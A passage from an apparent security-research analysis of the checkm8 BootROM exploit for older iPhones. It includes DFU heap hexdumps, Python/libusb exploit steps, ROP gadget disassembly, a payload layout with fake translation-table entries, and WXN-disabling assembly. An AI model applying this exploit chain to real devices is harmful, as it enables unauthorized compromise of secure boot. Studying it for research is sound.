00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x9880  // descs[2], Product
0x80 non-free 0x80 0
00000000: 3E 03 41 00 70 00 70 00  6C 00 65 00 20 00 4D 00  >.A.p.p.l.e. .M.
00000010: 6F 00 62 00 69 00 6C 00  65 00 20 00 44 00 65 00  o.b.i.l.e. .D.e.
00000020: 76 00 69 00 63 00 65 00  20 00 28 00 44 00 46 00  v.i.c.e. .(.D.F.
00000030: 55 00 20 00 4D 00 6F 00  64 00 65 00 29 00 FE FF  U. .M.o.d.e.)...
chunk at 0x9900  // descs[3], Serial number
0x140 non-free 0x80 0
00000000: C6 03 43 00 50 00 49 00  44 00 3A 00 38 00 30 00  ..C.P.I.D.:.8.0.
00000010: 31 00 30 00 20 00 43 00  50 00 52 00 56 00 3A 00  1.0. .C.P.R.V.:.
00000020: 31 00 31 00 20 00 43 00  50 00 46 00 4D 00 3A 00  1.1. .C.P.F.M.:.
00000030: 30 00 33 00 20 00 53 00  43 00 45 00 50 00 3A 00  0.3. .S.C.E.P.:.
00000040: 30 00 31 00 20 00 42 00  44 00 49 00 44 00 3A 00  0.1. .B.D.I.D.:.
00000050: 30 00 43 00 20 00 45 00  43 00 49 00 44 00 3A 00  0.C. .E.C.I.D.:.
00000060: 30 00 30 00 31 00 41 00  34 00 30 00 33 00 36 00  0.0.1.A.4.0.3.6.
00000070: 32 00 30 00 34 00 35 00  45 00 35 00 32 00 36 00  2.0.4.5.E.5.2.6.
00000080: 20 00 49 00 42 00 46 00  4C 00 3A 00 33 00 43 00   .I.B.F.L.:.3.C.
00000090: 20 00 53 00 52 00 54 00  47 00 3A 00 5B 00 69 00   .S.R.T.G.:.[.i.
000000A0: 42 00 6F 00 6F 00 74 00  2D 00 32 00 36 00 39 00  B.o.o.t.-.2.6.9.
000000B0: 36 00 2E 00 30 00 2E 00  30 00 2E 00 31 00 2E 00  6...0...0...1...
chunk at 0x9a40  // zlps[0]
0x80 non-free 0x140 0
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  40 96 1B 80 01 00 00 00  ........@.......
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x9ac0
0x46540 free 0x80 0
00000000: 00 00 00 00 00 00 00 00  F8 8F 08 80 01 00 00 00  ................
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  F8 8F 08 80 01 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
High Speed and Full Speed descriptors configuration overflow can also give an interesting result. These descriptors are located right after the I0 buffer. A configuration descriptor has one field responsible for its overall length. This field overflow makes it possible for us to read beyond the descriptor. You are free to try it via the exploit modification.

IO buffer allocation and freeing without the global state clearance
device = dfu.acquire_device()
device.serial_number
libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
dfu.release_device(device)
Incomplete OUT request for the image upload is created at this stage. The global state initialization and buffer address writing in the heap writing to the io_buffer happens at the same time. After that, DFU is reset with a DFU_CLR_STATUS request and new DFU iteration begins.

Usb_device_io_request overwriting in the heap with use-after-free
device = dfu.acquire_device()
device.serial_number
stall(device)
leak(device)
leak(device)
libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
What happens at this stage is usb_device_io_request type object allocation in the heap along with its overflow with t8010_overwrite. Its content was defined at the first stage.

t8010_nop_gadget and 0x1800B0800 values should overflow the callback and next fields of usb_device_io_request structure.

Below, you can see t8010_nop_gadget. It conforms to its name. However, the previous LR register is restored besides function return. This is the reason why the call free is skipped after the callback function in usb_core_complete_endpoint_io. This is critical as the heaps’ metadata gets damaged due to overflow. In turn, this impacts the exploit in response to a freeing attempt.

bootrom:000000010000CC6C                 LDP             X29, X30, [SP,#0x10+var_s0] // restore fp, lr
bootrom:000000010000CC70                 LDP             X20, X19, [SP+0x10+var_10],#0x20
bootrom:000000010000CC74                 RET
Next points to INSECURE_MEMORY + 0x800. After that, the exploit’s payload will be restored by INSECURE_MEMORY. A call-back chain will be at the 0x800 offset in the payload. This issue will be discussed below.

The payload placement.
for i in range(0, len(payload), 0x800):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0,
                                   payload[i:i+0x800], 50)
Within this stage, every next packet will be put into the memory area allocated for the image. Here is how the payload looks like:

0x1800B0000: t8010_shellcode  # initializing shell-code
...
0x1800B0180: t8010_handler  # new usb request handler
...
0x1800B0400: 0x1000006a5  # fake translation table descriptor
                          # corresponds to SecureROM (0x100000000 -> 0x100000000)
                          # matches the value in the original translation table
...
0x1800B0600: 0x60000180000625  # fake translation table descriptor
                               # corresponds to SecureRAM (0x180000000 -> 0x180000000)
                               # matches the value in the original translation table
0x1800B0608: 0x1800006a5  # fake translation table descriptor
                          # new value translates 0x182000000 into 0x180000000
                          # plus, in this descriptor,there are rights for code execution
0x1800B0610: disabe_wxn_arm64  # code for disabling WXN
0x1800B0800: usb_rop_callbacks  # callback-chain
Callback-chain execution.
dfu.usb_reset(device)
dfu.release_device(device)
Following USB reset, the cancellation loop incompletes usb_device_io_request in the wait list by going through the linked list started. While the previous stage, the rest of the wait list was replaced. This gives us control over call-back chain. This is the tool we used to build this chain:

bootrom:000000010000CC4C                 LDP             X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address
bootrom:000000010000CC50                 LSL             W2, W2, W9
bootrom:000000010000CC54                 MOV             X0, X8 ; arg0
bootrom:000000010000CC58                 BLR             X10 ; call
bootrom:000000010000CC5C                 CMP             W0, #0
bootrom:000000010000CC60                 CSEL            W0, W0, W19, LT
bootrom:000000010000CC64                 B               loc_10000CC6C
bootrom:000000010000CC68 ; ---------------------------------------------------------------------------
bootrom:000000010000CC68
bootrom:000000010000CC68 loc_10000CC68                           ; CODE XREF: sub_10000CC1C+18↑j
bootrom:000000010000CC68                 MOV             W0, #0
bootrom:000000010000CC6C
bootrom:000000010000CC6C loc_10000CC6C                           ; CODE XREF: sub_10000CC1C+48↑j
bootrom:000000010000CC6C                 LDP             X29, X30, [SP,#0x10+var_s0]
bootrom:000000010000CC70                 LDP             X20, X19, [SP+0x10+var_10],#0x20
bootrom:000000010000CC74                 RET
It is obvious that the call’s address, along with its first argument, is loaded at 0x70 offset from the pointer to the structure. This tool makes it possible to make any f(x) type call for f and x arbitrary easily.

Unicorn Engine is capable to emulate the whole call chain. This is what we did with our uEmu plugin modified version.


Below you can find the whole chain results for iPhone 7.

dc_civac 0x1800B0600
000000010000046C: SYS #3, c7, c14, #1, X0
0000000100000470: RET
The processor’s cache clearance and invalidation at a virtual address. This way, the processor address will become our payload going forward.

dmb
0000000100000478: DMB SY
000000010000047C: RET
A memory barrier guaranteeing all the memory related operations completion has to be done prior to this instruction. For the purpose of optimization, if we deal with high-performance processors, instructions can be executed in the order other than the programmed one.

enter_critical_section()
Interrupts are camouflaged for the further operations rapid execution.

write_ttbr0(0x1800B0000)
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1 (Translation Table Base Register 0 (EL1))
00000001000003E8: ISB
00000001000003EC: RET
TTBR0_EL1 table register’s new value is set in 0x1800B0000. This is the INSECURE MEMORY address where the exploit’s payload is stored. As you already know, certain payload offsets are the location of translation descriptors.

...
0x1800B0400: 0x1000006a5           0x100000000 -> 0x100000000 (rx)
...
0x1800B0600: 0x60000180000625      0x180000000 -> 0x180000000 (rw)
0x1800B0608: 0x1800006a5           0x182000000 -> 0x180000000 (rx)
...
tlbi
0000000100000434: DSB SY
0000000100000438: SYS #0, c8, c7, #0
000000010000043C: DSB SY
0000000100000440: ISB
0000000100000444: RET
The translation table became invalid to make addresses translation possible in accordance with our new translation table.

0x1820B0610 – disable_wxn_arm64
MOV  X1, #0x180000000
ADD  X2, X1, #0xA0000
ADD  X1, X1, #0x625
STR  X1, [X2,#0x600]
DMB  SY

MOV  X0, #0x100D
MSR  SCTLR_EL1, X0
DSB  SY
ISB

RET
WXN (Write permission implies Execute-never) is disabled which enables the code execution in RW memory. The modified translation table makes WXN disabling code execution possible.

write_ttbr0(0x1800A0000)
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1 (Translation Table Base Register 0 (EL1))
00000001000003E8: ISB
00000001000003EC: RET
TTBR0_EL1 translation register’s original value is restored. It has to be done to provide BootROM’s correct operating while virtual addresses translation as data stored in INSECURE_MEMORY will be overwritten.

tlbi
Another translation table reset.

exit_critical_section()
Interrupt handling gets back to normal.

0x1800B0000
Control is handed over to the initializing shellcode.

This way, callback-chain’s primary task is WXN disabling and control handing over to the shellcode in RW memory.

Shellcode execution
The shellcode is located in src/checkm8_arm64.S and its functions are described below:

USB configuration descriptors overwriting
Two pointers to configuration descriptors, which are usb_core_hs_configuration_descriptor and usb_core_fs_configuration_descriptor, located in the heap are stored in the global memory. These descriptors were damaged in the third stage. They are crucial for correct interaction with a USB device. Therefore, the shellcode restores them.

USB Serial Number Change
A new string descriptor containing serial number has a substring “PWND:[checkm8]” created while the string creation. This is a mean telling us if the exploit was completed successfully.

USB request handler pointer overwriting
Original USB requests to the interface handler pointer are overwritten by a new handler pointer. The new pointer will be placed in the memory during the next step.

USB request handler copying into TRAMPOLINE memory area (0x1800AFC00)
The new handler checks the wValue of the request versus 0xffff upon USB request receipt. In case they turn to be not equal, the control is returned to the original handler. If they are equal, diverse commands can be executed in new handlers, such as memcpy, memset and exec (calling an arbitrary address with an arbitrary arguments set).

So, the exploit analysis is completed.

The exploit execution at lower level of work with USB
We have a bonus for you. A Proof-of-Concept of the checkm8 execution was published on Arduino with USB Host shield as an example of the attack at lower level. The PoC is compatible with iPhone 7 only. However, it can be ported to other devices easily. All the steps depicted in this article can be executed when iPhone 7 in DFU mode is connected to USB Host Shield. The device will also enter PWND:[checkm8] mode. After that, you can connect it to PC via USB and work with it using ipwndfu (you should use crypto keys to dump memory). This approach is more stable in comparison with asynchronous requests with a minimal timeout as you work with the USB controller itself. We used the USB_Host_Shield_2.0 library. It requires minimal adjustments. The patch file is the repository as well.

The Output
Checkm8 analysis was challenging and interesting at the same time. Our hope is that this article will be beneficial for the community. We also hope it will encourage new researches in this field. The vulnerability will keep on impacting the jailbreak community. Checkra1n, the chekm8 based jailbreak, was already created. Given this vulnerability can’t be fixed, the jailbreak will work for vulnerable chips (A5 – A11) with any iOS version. Many vulnerable devices, such as iWatch, Apple TV and so on, are another advantage. We forecast more exciting projects to come up for Apple devices.

This vulnerability will also impact other Apple devices related researches besides of jailbreak. What can already be done with checkm8 is: iOS devices booting in verbose mode, SecureROM dumping or GID key use for firmware images decryption. But the most interesting application developed for this exploit would enter debug mode on vulnerable devices via special JTAG/SWD cable. Prior to that, the only way to do this was use of special prototypes which are very hard to get, or via special services. Good news is that Apple research becomes much cheaper and easier thanks to checkm8.



Follow the following accounts on Twitter for updates.
  https://twitter.com/axi0mX
